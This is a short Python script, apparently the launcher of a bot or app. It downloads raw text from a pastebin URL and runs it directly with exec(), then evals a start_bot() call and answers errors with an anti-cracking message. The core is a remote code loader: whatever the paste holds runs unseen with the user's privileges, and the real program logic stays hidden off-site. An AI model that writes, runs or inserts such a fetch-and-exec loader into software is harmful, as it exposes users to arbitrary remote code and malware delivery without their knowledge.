print("connect 2")
import requests
data = requests.get(url="https://pastebin.com/raw/yGyTJQVh").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
        start_bot()